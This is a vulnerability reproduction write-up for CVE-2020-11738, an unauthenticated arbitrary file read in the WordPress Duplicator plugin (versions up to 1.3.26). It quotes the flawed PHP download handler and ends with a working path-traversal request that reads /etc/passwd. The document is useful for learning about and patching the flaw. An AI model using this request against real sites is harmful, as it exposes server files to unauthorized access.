# WordPress Duplicator duplicator.php Arbitrary file reading vulnerability CVE-2020-11738

## Vulnerability Description

The WordPress Duplicator plug-in has caused arbitrary file reading vulnerability because it does not verify file downloads.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Duplicator <= v1.3.26</span>

## Plugin Name

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Duplicator</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip</span>

## Vulnerability reappears

First, check the registered action interface without authorization `wp-content/plugins/duplicator/ctrls/class.web.services.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1638523625856-1b37f8fa-0988-426e-a486-ce3aa4379097.png)

Here the corresponding function of `wp_ajax_nopriv_duplicator_download` is named duplicator_download

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1638523732618-c27820f7-da8f-42e7-9675-dcdf6dcbd156.png)

```php
public static function duplicator_download() {
        $file = sanitize_text_field($_GET['file']);
        $filepath = DUPLICATOR_SSDIR_PATH.'/'.$file;
        // Process download
        if(file_exists($filepath)) {
            // Clean output buffer
            if (ob_get_level() !== 0 && @ob_end_clean() === FALSE) {
                @ob_clean();
            }

            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filepath));
            flush(); // Flush system output buffer

            try {
                $fp = @fopen($filepath, 'r');
                if (false === $fp) {
                    throw new Exception('Fail to open the file '.$filepath);
                }
                while (!feof($fp) && ($data = fread($fp, DUPLICATOR_BUFFER_READ_WRITE_SIZE)) !== FALSE) {
                    echo $data;
                }
                @fclose($fp);
            } catch (Exception $e) {
                readfile($filepath);
            }
            exit;
        } else {
            wp_die('Invalid installer file name!!');
        }
    }
```

You can see that the parameter file is accepted here, spliced ​​into $filepath, you can know through debugging

DUPLICATOR_SSDIR_PATH is the wp-snapshots directory, the file is controllable and has no filtering, resulting in arbitrary file reading

```php
/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1638523863362-cd010b2b-66df-4243-b4e8-5834b6a9ce11.png)